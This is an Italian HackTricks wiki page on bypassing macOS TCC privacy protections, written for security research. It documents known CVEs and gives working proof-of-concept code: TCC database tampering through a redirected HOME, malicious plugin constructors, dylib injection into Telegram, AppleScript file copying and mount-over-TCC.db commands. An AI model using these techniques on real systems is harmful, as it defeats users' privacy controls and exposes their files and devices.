# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Per funzionalità

### Write Bypass

Questo non è un bypass, è semplicemente il modo in cui funziona TCC: **non protegge dalla scrittura**. Se Terminal **non ha accesso alla lettura della Desktop di un utente, può comunque scrivervi**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
L'attributo esteso **`com.apple.macl`** viene aggiunto al nuovo **file** per dare all'**app creatrice** accesso alla lettura.

### TCC ClickJacking

È possibile **posizionare una finestra sopra il prompt TCC** per far sì che l'utente lo **accetti** senza accorgersene. Puoi trovare una PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Richiesta TCC con un nome arbitrario

Un attaccante può **creare app con qualsiasi nome** (ad esempio Finder, Google Chrome...) nell'**`Info.plist`** e farle richiedere l'accesso a una posizione protetta da TCC. L'utente penserà che sia l'app legittima a richiedere questo accesso.\
Inoltre, è possibile **rimuovere l'app legittima dal Dock e inserirvi quella fake**, così quando l'utente fa clic su quella fake (che può utilizzare la stessa icona), questa può chiamare quella legittima, richiedere i permessi TCC ed eseguire un malware, facendo credere all'utente che sia stata l'app legittima a richiedere l'accesso.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Ulteriori informazioni e una PoC in:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Per impostazione predefinita, un accesso tramite **SSH aveva "Full Disk Access"**. Per disabilitarlo è necessario che sia elencato ma disabilitato (rimuoverlo dall'elenco non rimuoverà tali privilegi):

![TCC Request by arbitrary name - SSH Bypass: Per impostazione predefinita, un accesso tramite SSH aveva "Full Disk Access". Per disabilitarlo è necessario che sia elencato ma disabilitato (rimuoverlo...](<../../../../../images/image (1077).png>)

Qui puoi trovare esempi di come alcuni **malware siano riusciti a bypassare questa protezione**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Nota che ora, per poter abilitare SSH, è necessario **Full Disk Access**

### Handle extensions - CVE-2022-26767

L'attributo **`com.apple.macl`** viene assegnato ai file per dare a una **determinata applicazione i permessi per leggerlo.** Questo attributo viene impostato quando si esegue il **drag\&drop** di un file su un'app oppure quando un utente fa **doppio clic** su un file per aprirlo con l'**applicazione predefinita**.

Pertanto, un utente potrebbe **registrare un'app malevola** per gestire tutte le estensioni e chiamare Launch Services per **aprire** qualsiasi file (quindi al file malevolo verrà concesso l'accesso per leggerlo).

### iCloud

Con l'entitlement **`com.apple.private.icloud-account-access`** è possibile comunicare con il **servizio XPC `com.apple.iCloudHelper`**, che **fornirà i token iCloud**.

**iMovie** e **Garageband** avevano questo entitlement e altri che lo permettevano.

Per ulteriori **informazioni** sull'exploit per **ottenere i token iCloud** tramite quell'entitlement, consulta il talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Un'app con il permesso **`kTCCServiceAppleEvents`** sarà in grado di **controllare altre app**. Ciò significa che potrebbe essere in grado di **abusare dei permessi concessi alle altre app**.

Per ulteriori informazioni sugli Apple Scripts, consulta:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Ad esempio, se un'app ha il **permesso Automation su `iTerm`**, in questo esempio **`Terminal`** ha accesso a iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Su iTerm

Terminal, che non dispone di FDA, può chiamare iTerm, che ne dispone, e utilizzarlo per eseguire azioni:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Tramite Finder

Oppure, se un'app ha accesso tramite Finder, potrebbe eseguire uno script come questo:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Comportamento per app

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Il **tccd daemon** in userland utilizzava la variabile **`HOME`** **env** per accedere al database TCC degli utenti da: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Secondo [questo post su Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e poiché il daemon TCC viene eseguito tramite `launchd` all’interno del dominio dell’utente corrente, è possibile **controllare tutte le variabili d’ambiente** che gli vengono passate.\
Di conseguenza, un **attacker potrebbe impostare la variabile d’ambiente `$HOME`** in **`launchctl`** affinché punti a una **directory** **controllata**, **riavviare il** daemon **TCC** e quindi **modificare direttamente il database TCC** per concedersi **ogni entitlement TCC disponibile** senza che venga mai mostrato alcun prompt all’utente finale.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes aveva accesso a posizioni protette da TCC, ma quando viene creata una nota questa viene **creata in una posizione non protetta**. Quindi, era possibile chiedere a Notes di copiare un file protetto in una nota (quindi in una posizione non protetta) e poi accedere al file:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Il binary `/usr/libexec/lsd`, con la libreria `libsecurity_translocate`, aveva l'entitlement `com.apple.private.nullfs_allow`, che gli consentiva di creare mount **nullfs**, e aveva l'entitlement `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** per accedere a ogni file.

Era possibile aggiungere l'attributo quarantine a "Library", chiamare il servizio XPC **`com.apple.security.translocation`**, dopodiché questo avrebbe mappato Library in **`$TMPDIR/AppTranslocation/d/d/Library`**, dove tutti i documenti all'interno di Library potevano essere **accessed**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** ha una feature interessante: quando è in esecuzione, **importerà** i file inseriti in **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** nella "media library" dell'utente. Inoltre, chiama qualcosa come: **`rename(a, b);`**, dove `a` e `b` sono:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Questo comportamento di **`rename(a, b);`** è vulnerabile a una **Race Condition**, poiché è possibile inserire nella cartella `Automatically Add to Music.localized` un file **TCC.db** falso e poi, quando viene creata la nuova cartella(b), copiare il file, eliminarlo e puntarlo a **`~/Library/Application Support/com.apple.TCC`**/.
**More info** [**in the writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)


### SQLITE_SQLLOG_DIR - CVE-2023-32422

Se **`SQLITE_SQLLOG_DIR="path/folder"`** è impostato, significa sostanzialmente che **qualsiasi db aperto viene copiato in quel percorso**. In questo CVE, questo controllo è stato sfruttato per **scrivere** all'interno di un **database SQLite** che sarebbe stato **aperto da un processo con FDA sul** database TCC, e poi abusare di **`SQLITE_SQLLOG_DIR`** con un **symlink nel filename**, in modo che quando il database viene **aperto**, il file **TCC.db dell'utente viene sovrascritto** con quello aperto.\
**More info** [**in the writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **and**[ **in the talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Se la variabile d'ambiente **`SQLITE_AUTO_TRACE`** è impostata, la libreria **`libsqlite3.dylib`** inizierà a **registrare** tutte le query SQL. Molte applicazioni usavano questa libreria, quindi era possibile registrare tutte le loro query SQLite.

Diverse applicazioni Apple usavano questa libreria per accedere a informazioni protette da TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Questa **env variable è usata dal framework `Metal`**, che è una dependency di vari programmi, in particolare `Music`, che dispone di FDA.

Impostando quanto segue: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Se `path` è una directory valida, il bug viene attivato e possiamo usare `fs_usage` per vedere cosa sta succedendo nel programma:

- un file verrà aperto con `open()`, chiamato `path/.dat.nosyncXXXX.XXXXXX` (X è casuale)
- una o più `write()` scriveranno il contenuto nel file (non lo controlliamo)
- `path/.dat.nosyncXXXX.XXXXXX` verrà rinominato con `rename()` in `path/name`

Si tratta della scrittura di un file temporaneo, seguita da un **`rename(old, new)`** **che non è sicuro.**

Non è sicuro perché deve **risolvere separatamente i percorsi old e new**, operazione che può richiedere del tempo ed essere vulnerabile a una Race Condition. Per ulteriori informazioni puoi consultare la funzione `renameat_internal()` di `xnu`.

> [!CAUTION]
> Quindi, in sostanza, se un processo privilegiato esegue il rename da una cartella che controlli, potresti riuscire a ottenere una RCE e fare in modo che acceda a un file diverso oppure, come in questo CVE, apra il file creato dall'app privilegiata e memorizzi un FD.
>
> Se il rename accede a una cartella che controlli, mentre hai modificato il file sorgente o possiedi un FD che lo indica, puoi modificare il file (o la cartella) di destinazione affinché punti a un symlink, così da poter scrivere quando vuoi.

Questo era l'attacco usato nel CVE: per esempio, per sovrascrivere il `TCC.db` dell'utente, possiamo:

- creare `/Users/hacker/ourlink` affinché punti a `/Users/hacker/Library/Application Support/com.apple.TCC/`
- creare la directory `/Users/hacker/tmp/`
- impostare `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- attivare il bug eseguendo `Music` con questa env variable
- intercettare l'`open()` di `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X è casuale)
- qui apriamo anche questo file in scrittura e conserviamo il file descriptor
- scambiare atomicamente `/Users/hacker/tmp` con `/Users/hacker/ourlink` **in un loop**
- lo facciamo per massimizzare le probabilità di successo, poiché la race window è piuttosto ridotta, ma perdere la race ha conseguenze trascurabili
- aspettare un po'
- verificare se siamo stati fortunati
- in caso contrario, eseguire nuovamente la procedura dall'inizio

Maggiori informazioni in [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Ora, se provi a usare l'env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE`, le app non si avvieranno

### Apple Remote Desktop

Come root, potresti abilitare questo servizio e **l'agente ARD avrebbe accesso completo al disco**, che potrebbe poi essere abusato da un utente per fargli copiare un nuovo **TCC user database**.

## By **NFSHomeDirectory**

TCC usa un database nella cartella HOME dell'utente per controllare l'accesso alle risorse specifiche dell'utente in **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Pertanto, se l'utente riesce a riavviare TCC con una variabile d'ambiente `$HOME` che punta a una **cartella diversa**, potrebbe creare un nuovo database TCC in **/Library/Application Support/com.apple.TCC/TCC.db** e indurre TCC a concedere qualsiasi permesso TCC a qualsiasi app.

> [!TIP]
> Nota che Apple usa l'impostazione memorizzata nel profilo dell'utente, nell'attributo **`NFSHomeDirectory`**, come **valore di `$HOME`**; pertanto, se comprometti un'applicazione con i permessi necessari per modificare questo valore (**`kTCCServiceSystemPolicySysAdminFiles`**), puoi **weaponize** questa opzione con un TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Il **primo POC** usa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) e [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) per modificare la cartella **HOME** dell'utente.

1. Ottenere un blob _csreq_ per l'app target.
2. Installare un file _TCC.db_ falso con i permessi richiesti e il blob _csreq_.
3. Esportare la voce Directory Services dell'utente con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modificare la voce Directory Services per cambiare la home directory dell'utente.
5. Importare la voce Directory Services modificata con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Arrestare il _tccd_ dell'utente e riavviare il processo.

Il secondo POC usava **`/usr/libexec/configd`**, che possedeva `com.apple.private.tcc.allow` con il valore `kTCCServiceSystemPolicySysAdminFiles`.\
Era possibile eseguire **`configd`** con l'opzione **`-t`**, che consentiva a un attacker di specificare un **Bundle personalizzato da caricare**. Pertanto, l'exploit **sostituisce** il metodo **`dsexport`** e **`dsimport`** per cambiare la home directory dell'utente con una **code injection in `configd`**.

Per maggiori informazioni, consulta il [**report originale**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## By process injection

Esistono diverse tecniche per iniettare codice all'interno di un processo e abusare dei suoi privilegi TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Inoltre, la process injection più comune trovata per bypassare TCC avviene tramite **plugin (load library)**.\
I plugin sono codice aggiuntivo, solitamente sotto forma di librerie o plist, che verrà **caricato dall'applicazione principale** ed eseguito nel suo contesto. Pertanto, se l'applicazione principale aveva accesso a file con restrizioni TCC (tramite permessi concessi o entitlements), anche il **codice personalizzato avrà lo stesso accesso**.

### CVE-2020-27937 - Directory Utility

L'applicazione `/System/Library/CoreServices/Applications/Directory Utility.app` possedeva l'entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, caricava plugin con estensione **`.daplug`** e **non aveva l'hardened** runtime.

Per weaponize questo CVE, **`NFSHomeDirectory`** viene **modificato** (abusando dell'entitlement precedente) per poter **prendere il controllo del database TCC dell'utente** e bypassare TCC.

Per maggiori informazioni, consulta il [**report originale**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Il binary **`/usr/sbin/coreaudiod`** possedeva gli entitlements `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. Il primo **consentiva la code injection**, mentre il secondo gli dava accesso alla **gestione di TCC**.

Questo binary consentiva di caricare **plug-in di terze parti** dalla cartella `/Library/Audio/Plug-Ins/HAL`. Pertanto, era possibile **caricare un plugin e abusare dei permessi TCC** con questo PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Per ulteriori informazioni, consulta il [**report originale**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-In del Device Abstraction Layer (DAL)

Le applicazioni di sistema che aprono lo stream della fotocamera tramite Core Media I/O (app con **`kTCCServiceCamera`**) caricano nel processo questi plugin, che si trovano in `/Library/CoreMediaIO/Plug-Ins/DAL` (non soggetta alle restrizioni SIP).

È sufficiente salvare al suo interno una library con il **constructor** comune per **iniettare codice**.

Diverse applicazioni Apple erano vulnerabili a questo problema.

### Firefox

L'applicazione Firefox disponeva degli entitlements `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Per ulteriori informazioni su come sfruttare facilmente questa vulnerabilità, [**consulta il report originale**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Il binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` disponeva degli entitlements **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, che consentivano di iniettare codice nel processo e utilizzare i privilegi TCC.

### CVE-2023-26818 - Telegram

Telegram disponeva degli entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, quindi era possibile abusarne per **ottenere l'accesso ai suoi permessi**, ad esempio per registrare tramite la fotocamera. Puoi [**trovare il payload nel writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Nota che, per utilizzare la variabile d'ambiente e caricare una libreria, è stato creato un **custom plist** per iniettare questa libreria ed è stato utilizzato **`launchctl`** per avviarlo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Tramite invocazioni di open

È possibile invocare **`open`** anche quando si è in sandbox

### Script del Terminale

È piuttosto comune concedere al Terminale l'accesso completo al disco (FDA), almeno sui computer utilizzati da persone esperte di tecnologia. Ed è possibile invocare script **`.terminal`** utilizzandolo.

Gli script **`.terminal`** sono file plist come questo, con il comando da eseguire nella chiave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Un'applicazione potrebbe scrivere uno script terminale in una posizione come /tmp e avviarlo con un comando come:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Tramite il montaggio

### CVE-2020-9771 - mount_apfs TCC bypass e privilege escalation

**Qualsiasi utente** (anche quelli senza privilegi) può creare e montare uno snapshot di Time Machine e **accedere a TUTTI i file** di quello snapshot.\
L’unico **privilegio** necessario è che l’applicazione utilizzata (come `Terminal`) disponga dell’accesso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), che deve essere concesso da un amministratore.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Una spiegazione più dettagliata è disponibile nel [**report originale**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Anche se il file TCC DB è protetto, era possibile **eseguire il mount sopra la directory** di un nuovo file TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Consulta lo **sfruttamento completo** nell'[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Come spiegato nell'[original writeup](https://www.kandji.io/blog/macos-audit-story-part2), questo CVE sfruttava `diskarbitrationd`.

La funzione `DADiskMountWithArgumentsCommon` del framework pubblico `DiskArbitration` eseguiva i controlli di sicurezza. Tuttavia, era possibile aggirarli chiamando direttamente `diskarbitrationd` e utilizzando quindi elementi `../` nel percorso e symlink.

Questo consentiva a un attacker di eseguire mount arbitrari in qualsiasi posizione, anche sopra il database TCC, grazie all'entitlement `com.apple.private.security.storage-exempt.heritable` di `diskarbitrationd`.

### asr

Lo strumento **`/usr/sbin/asr`** consentiva di copiare l'intero disco e montarlo in un'altra posizione, aggirando le protezioni TCC.

### Location Services

Esiste un terzo database TCC in **`/var/db/locationd/clients.plist`** che indica i client autorizzati ad **accedere ai servizi di localizzazione**.\
La cartella **`/var/db/locationd/` non era protetta dal mounting di DMG**, quindi era possibile montare il nostro plist.

## Tramite startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Tramite grep

In diverse occasioni, i file memorizzano informazioni sensibili come email, numeri di telefono, messaggi... in posizioni non protette (considerato una vulnerabilità da Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Questo non funziona più, ma [**in passato funzionava**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Un altro metodo che utilizza gli [**eventi CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
